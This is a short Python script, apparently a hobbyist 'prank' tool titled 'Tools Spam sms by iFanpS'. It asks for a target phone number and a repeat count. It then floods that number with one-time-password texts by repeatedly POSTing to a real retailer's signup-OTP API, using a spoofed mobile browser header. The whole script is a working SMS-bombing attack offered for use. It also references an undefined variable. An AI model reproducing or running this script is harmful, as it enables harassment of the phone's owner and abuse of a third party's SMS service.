#Credit to F4R(RAYA)
import os,sys,time,requests
from requests import post
import subprocess
 
def bersih():
    os.system("clear")
 
def ulang():
    pengulangan = input("Try again? (y/n):")
    if pengulangan == "y":
       subprocess.call("python Prank-SMS.py",shell=True)
    elif pengulangan == "n":
         print ("exit")
         sys.exit()
bersih()
print("""
================================
Tools Spam sms by iFanpS
Usage: (EX: 081*********)
================================
""")
print (lambang)
no = input("Put phone Number: ")
jm = int(input("Count for spam: "))
head = {
"Connection": "keep-alive",
"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",}
 
dat = {
"phone": no,
}
for i in range(jm):
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=head)
    print ("status: ", r.json())
ulang()
